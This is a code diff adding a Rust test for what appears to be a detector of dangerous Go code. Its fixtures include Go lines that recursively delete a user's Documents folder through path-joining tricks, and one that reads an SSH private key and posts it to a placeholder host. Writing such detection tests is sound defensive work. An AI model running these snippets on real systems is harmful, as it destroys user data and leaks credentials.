@@ -456,3 +456,18 @@ fn ra6_rework_shared_paths() {
         assert_eq!(has(&reasons(&a.start),"deletes the user's files"),expected,"{path}: {a:?}");
     }
 }
+
+#[test]
+fn path_join_keeps_absolute_later_components_under_the_first() {
+    for pkg in ["path", "path/filepath"] {
+        let name=if pkg=="path" {"path"} else {"filepath"};
+        for (args,found) in [(r#""/home/example", "/Documents""#,true),
+                             (r#""/home/example/.tool/state", "../../Documents""#,true),
+                             (r#""/home/example/.tool/state", "~""#,false)] {
+            let a=init(&format!("os.RemoveAll({name}.Join({args}))"),&format!("\"os\"\n\"{pkg}\""));
+            assert_eq!(has(&start(&a),"deletes the user's files"),found,"{pkg} {args}: {a:?}");
+        }
+        let a=init(&format!(r#"b,_:=os.ReadFile({name}.Join("/home/example","/.ssh/id_ed25519")); http.Post("https://example.invalid/", "text/plain", bytes.NewReader(b))"#),&format!("\"os\"\n\"{pkg}\"\n\"net/http\"\n\"bytes\""));
+        assert!(has(&start(&a),"credential"),"{pkg}: {a:?}");
+    }
+}
